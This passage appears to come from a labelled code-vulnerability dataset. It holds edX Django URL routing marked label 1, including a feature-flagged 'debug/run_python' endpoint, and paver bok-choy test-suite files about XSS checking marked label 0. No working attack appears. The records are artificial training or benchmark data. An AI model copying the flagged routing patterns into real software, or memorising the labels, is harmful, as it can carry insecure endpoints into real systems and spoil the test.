'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n/n/n/n", "label": 1}, {"id": "1162dbc18fda91b07a5942873387d60fd67b2cfc", "code": "pavelib/paver_tests/test_paver_bok_choy_cmds.py/n/n\"\"\"\nTests for the bok-choy paver commands themselves.\nRun just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py\n\"\"\"\nimport os\nimport unittest\n\nfrom mock import patch, call\nfrom test.test_support import EnvironmentVarGuard\nfrom paver.easy import BuildFailure\nfrom pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler\n\nREPO_DIR = os.getcwd()\n\n\nclass TestPaverBokChoyCmd(unittest.TestCase):\n    \"\"\"\n    Paver Bok Choy Command test cases\n    \"\"\"\n\n    def _expected_command(self, name, store=None, verify_xss=True):\n        \"\"\"\n        Returns the command that is expected to be run for the given test spec\n        and store.\n        \"\"\"\n\n        expected_statement = (\n            \"DEFAULT_STORE={default_store} \"\n            \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \"\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \"\n            \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"VERIFY_XSS='{verify_xss}' \"\n            \"nosetests {repo_dir}/common/test/acceptance/{exp_text} \"\n            \"--with-xunit \"\n            \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \"\n            \"--verbosity=2 \"\n        ).format(\n            default_store=store,\n            repo_dir=REPO_DIR,\n            shard_str='/shard_' + self.shard if self.shard else '',\n            exp_text=name,\n            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',\n            verify_xss=verify_xss\n        )\n        return expected_statement\n\n    def setUp(self):\n        super(TestPaverBokChoyCmd, self).setUp()\n        self.shard = os.environ.get('SHARD')\n        self.env_var_override = EnvironmentVarGuard()\n\n    def test_default(self):\n        suite = BokChoyTestSuite('')\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_suite_spec(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_class_spec(self):\n        spec = 'test_foo.py:FooTest'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_testcase_spec(self):\n        spec = 'test_foo.py:FooTest.test_bar'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_spec_with_draft_default_store(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='draft')\n        )\n\n    def test_invalid_default_store(self):\n        # the cmd will dumbly compose whatever we pass in for the default_store\n        suite = BokChoyTestSuite('', default_store='invalid')\n        name = 'tests'\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='invalid')\n        )\n\n    def test_serversonly(self):\n        suite = BokChoyTestSuite('', serversonly=True)\n        self.assertEqual(suite.cmd, \"\")\n\n    def test_verify_xss(self):\n        suite = BokChoyTestSuite('', verify_xss=True)\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_verify_xss_env_var(self):\n        self.env_var_override.set('VERIFY_XSS', 'False')\n        with self.env_var_override:\n            suite = BokChoyTestSuite('')\n            name = 'tests'\n            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))\n\n    def test_test_dir(self):\n        test_dir = 'foo'\n        suite = BokChoyTestSuite('', test_dir=test_dir)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=test_dir)\n        )\n\n    def test_verbosity_settings_1_process(self):\n        \"\"\"\n        Using 1 process means paver should ask for the traditional xunit plugin for plugin results\n        \"\"\"\n        expected_verbosity_string = (\n            \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else ''\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=1)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_2_processes(self):\n        \"\"\"\n        Using multiple processes means specific xunit, coloring, and process-related settings should\n        be used.\n        \"\"\"\n        process_count = 2\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_3_processes(self):\n        \"\"\"\n        With the above test, validate that num_processes can be set to various values\n        \"\"\"\n        process_count = 3\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_invalid_verbosity_and_processes(self):\n        \"\"\"\n        If an invalid combination of verbosity and number of processors is passed in, a\n        BuildFailure should be raised\n        \"\"\"\n        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)\n        with self.assertRaises(BuildFailure):\n            BokChoyTestSuite.verbosity_processes_string(suite)\n\n\nclass TestPaverPa11yCrawlerCmd(unittest.TestCase):\n\n    \"\"\"\n    Paver pa11ycrawler command test cases.  Most of the functionality is\n    inherited from BokChoyTestSuite, so those tests aren't duplicated.\n    \"\"\"\n\n    def setUp(self):\n        super(TestPaverPa11yCrawlerCmd, self).setUp()\n\n        # Mock shell commands\n        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')\n        self._mock_sh = mock_sh.start()\n\n        # Cleanup mocks\n        self.addCleanup(mock_sh.stop)\n\n    def _expected_command(self, report_dir, start_urls):\n        \"\"\"\n        Returns the expected command to run pa11ycrawler.\n        \"\"\"\n        expected_statement = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains=localhost '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher=logout '\n            '--pa11y-reporter=\"1.0-json\" '\n            '--depth-limit=6 '\n        ).format(\n            start_urls=' '.join(start_urls),\n            report_dir=report_dir,\n        )\n        return expected_statement\n\n    def test_default(self):\n        suite = Pa11yCrawler('')\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(suite.pa11y_report_dir, suite.start_urls)\n        )\n\n    def test_get_test_course(self):\n        suite = Pa11yCrawler('')\n        suite.get_test_course()\n        self._mock_sh.assert_has_calls([\n            call(\n                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),\n            call(\n                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),\n        ])\n\n    def test_generate_html_reports(self):\n        suite = Pa11yCrawler('')\n        suite.generate_html_reports()\n        self._mock_sh.assert_has_calls([\n            call(\n                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),\n        ])\n/n/n/npavelib/utils/test/suites/bokchoy_suite.py/n/n\"\"\"\nClass used for defining and running Bok Choy acceptance test suite\n\"\"\"\nfrom time import sleep\nfrom urllib import urlencode\n\nfrom common.test.acceptance.fixtures.course import CourseFixture, FixtureError\n\nfrom path import Path as path\nfrom paver.easy import sh, BuildFailure\nfrom pavelib.utils.test.suites.suite import TestSuite\nfrom pavelib.utils.envs import Env\nfrom pavelib.utils.test import bokchoy_utils\nfrom pavelib.utils.test import utils as test_utils\n\nimport os\n\ntry:\n    from pygments.console import colorize\nexcept ImportError:\n    colorize = lambda color, text: text\n\n__test__ = False  # do not collect\n\nDEFAULT_NUM_PROCESSES = 1\nDEFAULT_VERBOSITY = 2\n\n\nclass BokChoyTestSuite(TestSuite):\n    \"\"\"\n    TestSuite for running Bok Choy tests\n    Properties (below is a subset):\n      test_dir - parent directory for tests\n      log_dir - directory for test output\n      report_dir - directory for reports (e.g., coverage) related to test execution\n      xunit_report - directory for xunit-style output (xml)\n      fasttest - when set, skip various set-up tasks (e.g., collectstatic)\n      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C\n      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment\n      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.\n      default_store - modulestore to use when running tests (split or draft)\n      num_processes - number of processes or threads to use in tests. Recommendation is that this\n      is less than or equal to the number of available processors.\n      verify_xss - when set, check for XSS vulnerabilities in the page HTML.\n      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html\n    \"\"\"\n    def __init__(self, *args, **kwargs):\n        super(BokChoyTestSuite, self).__init__(*args, **kwargs)\n        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')\n        self.log_dir = Env.BOK_CHOY_LOG_DIR\n        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)\n        self.xunit_report = self.report_dir / \"xunit.xml\"\n        self.cache = Env.BOK_CHOY_CACHE\n        self.fasttest = kwargs.get('fasttest', False)\n        self.serversonly = kwargs.get('serversonly', False)\n        self.testsonly = kwargs.get('testsonly', False)\n        self.test_spec = kwargs.get('test_spec', None)\n        self.default_store = kwargs.get('default_store', None)\n        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))\n        self.extra_args = kwargs.get('extra_args', '')\n        self.har_dir = self.log_dir / 'hars'\n        self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n        self.imports_dir = kwargs.get('imports_dir', None)\n        self.coveragerc = kwargs.get('coveragerc', None)\n        self.save_screenshots = kwargs.get('save_screenshots', False)\n\n    def __enter__(self):\n        super(BokChoyTestSuite, self).__enter__()\n\n        # Ensure that we have a directory to put logs and reports\n        self.log_dir.makedirs_p()\n        self.har_dir.makedirs_p()\n        self.report_dir.makedirs_p()\n        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter\n\n        if not (self.fasttest or self.skip_clean or self.testsonly):\n            test_utils.clean_test_files()\n\n        msg = colorize('green', \"Checking for mongo, memchache, and mysql...\")\n        print msg\n        bokchoy_utils.check_services()\n\n        if not self.testsonly:\n            self.prepare_bokchoy_run()\n        else:\n            # load data in db_fixtures\n            self.load_data()\n\n        msg = colorize('green', \"Confirming servers have started...\")\n        print msg\n        bokchoy_utils.wait_for_test_servers()\n        try:\n            # Create course in order to seed forum data underneath. This is\n            # a workaround for a race condition. The first time a course is created;\n            # role permissions are set up for forums.\n            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()\n            print 'Forums permissions/roles data has been seeded'\n        except FixtureError:\n            # this means it's already been done\n            pass\n\n        if self.serversonly:\n            self.run_servers_continuously()\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)\n\n        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)\n        if self.testsonly:\n            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')\n            print msg\n        else:\n            # Clean up data we created in the databases\n            msg = colorize('green', \"Cleaning up databases...\")\n            print msg\n            sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\")\n            bokchoy_utils.clear_mongo()\n\n    def verbosity_processes_string(self):\n        \"\"\"\n        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct\n        the proper combination for use with nosetests.\n        \"\"\"\n        substring = []\n\n        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:\n            msg = 'Cannot pass in both num_processors and verbosity. Quitting'\n            raise BuildFailure(msg)\n\n        if self.num_processes != 1:\n            # Construct \"multiprocess\" nosetest substring\n            substring = [\n                \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report),\n                \"--processes={}\".format(self.num_processes),\n                \"--no-color --process-timeout=1200\"\n            ]\n\n        else:\n            substring = [\n                \"--with-xunit\",\n                \"--xunit-file={}\".format(self.xunit_report),\n                \"--verbosity={}\".format(self.verbosity),\n            ]\n\n        return \" \".join(substring)\n\n    def prepare_bokchoy_run(self):\n        \"\"\"\n        Sets up and starts servers for a Bok Choy run. If --fasttest is not\n        specified then static assets are collected\n        \"\"\"\n        sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT))\n\n        if not self.fasttest:\n            self.generate_optimized_static_assets()\n\n        # Clear any test data already in Mongo or MySQLand invalidate\n        # the cache\n        bokchoy_utils.clear_mongo()\n        self.cache.flush_all()\n\n        # load data in db_fixtures\n        self.load_data()\n\n        # load courses if self.imports_dir is set\n        self.load_courses()\n\n        # Ensure the test servers are available\n        msg = colorize('green', \"Confirming servers are running...\")\n        print msg\n        bokchoy_utils.start_servers(self.default_store, self.coveragerc)\n\n    def load_courses(self):\n        \"\"\"\n        Loads courses from self.imports_dir.\n\n        Note: self.imports_dir is the directory that contains the directories\n        that have courses in them. For example, if the course is located in\n        `test_root/courses/test-example-course/`, self.imports_dir should be\n        `test_root/courses/`.\n        \"\"\"\n        msg = colorize('green', \"Importing courses from {}...\".format(self.imports_dir))\n        print msg\n\n        if self.imports_dir:\n            sh(\n                \"DEFAULT_STORE={default_store}\"\n                \" ./manage.py cms --settings=bok_choy import {import_dir}\".format(\n                    default_store=self.default_store,\n                    import_dir=self.imports_dir\n                )\n            )\n\n    def load_data(self):\n        \"\"\"\n        Loads data into database from db_fixtures\n        \"\"\"\n        print 'Loading data from json fixtures in db_fixtures directory'\n        sh(\n            \"DEFAULT_STORE={default_store}\"\n            \" ./manage.py lms --settings bok_choy loaddata --traceback\"\n            \" common/test/db_fixtures/*.json\".format(\n                default_store=self.default_store,\n            )\n        )\n\n    def run_servers_continuously(self):\n        \"\"\"\n        Infinite loop. Servers will continue to run in the current session unless interrupted.\n        \"\"\"\n        print 'Bok-choy servers running. Press Ctrl-C to exit...\\n'\n        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n'\n\n        while True:\n            try:\n                sleep(10000)\n            except KeyboardInterrupt:\n                print \"Stopping bok-choy servers.\\n\"\n                break\n\n    @property\n    def cmd(self):\n        \"\"\"\n        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,\n         the command returns an empty string.\n        \"\"\"\n        # Default to running all tests if no specific test is specified\n        if not self.test_spec:\n            test_spec = self.test_dir\n        else:\n            test_spec = self.test_dir / self.test_spec\n\n        # Skip any additional commands (such as nosetests) if running in\n        # servers only mode\n        if self.serversonly:\n            return \"\"\n\n        # Construct the nosetests command, specifying where to save\n        # screenshots and XUnit XML reports\n        cmd = [\n            \"DEFAULT_STORE={}\".format(self.default_store),\n            \"SCREENSHOT_DIR='{}'\".format(self.log_dir),\n            \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir),\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file),\n            \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir),\n            \"VERIFY_XSS='{}'\".format(self.verify_xss),\n            \"nosetests\",\n            test_spec,\n            \"{}\".format(self.verbosity_processes_string())\n        ]\n        if self.pdb:\n            cmd.append(\"--pdb\")\n        if self.save_screenshots:\n            cmd.append(\"--with-save-baseline\")\n        cmd.append(self.extra_args)\n\n        cmd = (\" \").join(cmd)\n        return cmd\n\n\nclass Pa11yCrawler(BokChoyTestSuite):\n    \"\"\"\n    Sets up test environment with mega-course loaded, and runs pa11ycralwer\n    against it.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        super(Pa11yCrawler, self).__init__(*args, **kwargs)\n        self.course_key = kwargs.get('course_key')\n        if self.imports_dir:\n            # If imports_dir has been specified, assume the files are\n            # already there -- no need to fetch them from github. This\n            # allows someome to crawl a different course. They are responsible\n            # for putting it, un-archived, in the directory.\n            self.should_fetch_course = False\n        else:\n            # Otherwise, obey `--skip-fetch` command and use the default\n            # test course.  Note that the fetch will also be skipped when\n            # using `--fast`.\n            self.should_fetch_course = kwargs.get('should_fetch_course')\n            self.imports_dir = path('test_root/courses/')\n\n        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')\n        self.tar_gz_file = \"https://github.com/edx/demo-test-course/archive/master.tar.gz\"\n\n        self.start_urls = []\n        auto_auth_params = {\n            \"redirect\": 'true',\n            \"staff\": 'true',\n            \"course_id\": self.course_key,\n        }\n        cms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params))\n\n        sequence_url = \"/api/courses/v1/blocks/?{}\".format(\n            urlencode({\n                \"course_id\": self.course_key,\n                \"depth\": \"all\",\n                \"all_blocks\": \"true\",\n            })\n        )\n        auto_auth_params.update({'redirect_to': sequence_url})\n        lms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params))\n\n    def __enter__(self):\n        if self.should_fetch_course:\n            self.get_test_course()\n        super(Pa11yCrawler, self).__enter__()\n\n    def get_test_course(self):\n        \"\"\"\n        Fetches the test course.\n        \"\"\"\n        self.imports_dir.makedirs_p()\n        zipped_course = self.imports_dir + 'demo_course.tar.gz'\n\n        msg = colorize('green', \"Fetching the test course from github...\")\n        print msg\n\n        sh(\n            'wget {tar_gz_file} -O {zipped_course}'.format(\n                tar_gz_file=self.tar_gz_file,\n                zipped_course=zipped_course,\n            )\n        )\n\n        msg = colorize('green', \"Uncompressing the test course...\")\n        print msg\n\n        sh(\n            'tar zxf {zipped_course} -C {courses_dir}'.format(\n                zipped_course=zipped_course,\n                courses_dir=self.imports_dir,\n            )\n        )\n\n    def generate_html_reports(self):\n        \"\"\"\n        Runs pa11ycrawler json-to-html\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'\n        ).format(report_dir=self.pa11y_report_dir)\n\n        sh(cmd_str)\n\n    @property\n    def cmd(self):\n        \"\"\"\n        Runs pa11ycrawler as staff user against the test course.\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains={allowed_domains} '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher={dont_go_here} '\n            '--pa11y-reporter=\"{reporter}\" '\n            '--depth-limit={depth} '\n        ).format(\n            start_urls=' '.join(self.start_urls),\n            allowed_domains='localhost',\n            report_dir=self.pa11y_report_dir,\n            reporter=\"1.0-json\",\n            dont_go_here=\"logout\",\n            depth=\"6\",\n        )\n        return cmd_str\n/n/n/n", "label": 0}, {"id": "1162dbc18fda91b07a5942873387d60fd67b2cfc", "code": "/pavelib/paver_tests/test_paver_bok_choy_cmds.py/n/n\"\"\"\nTests for the bok-choy paver commands themselves.\nRun just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py\n\"\"\"\nimport os\nimport unittest\n\nfrom mock import patch, call\nfrom test.test_support import EnvironmentVarGuard\nfrom paver.easy import BuildFailure\nfrom pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler\n\nREPO_DIR = os.getcwd()\n\n\nclass TestPaverBokChoyCmd(unittest.TestCase):\n    \"\"\"\n    Paver Bok Choy Command test cases\n    \"\"\"\n\n    def _expected_command(self, name, store=None, verify_xss=False):\n        \"\"\"\n        Returns the command that is expected to be run for the given test spec\n        and store.\n        \"\"\"\n\n        expected_statement = (\n            \"DEFAULT_STORE={default_store} \"\n            \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \"\n            